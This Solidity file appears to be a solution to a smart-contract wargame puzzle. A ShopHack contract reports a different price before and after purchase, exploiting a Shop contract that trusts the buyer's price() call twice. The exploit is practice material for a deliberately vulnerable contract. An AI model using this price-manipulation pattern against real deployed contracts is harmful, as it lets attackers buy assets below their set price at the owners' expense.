// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract ShopHack {
    Shop shop;
    bool updatePrice = false;


    constructor(address shopAddress) {
        shop = Shop(shopAddress);
    }

    function price() external view returns (uint256){
        if (!shop.isSold()) {
            return 100;
        }
        return 99;
    }

    function sneak() public {
        shop.buy();
    }
}

// Action: Just call contract.buy

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}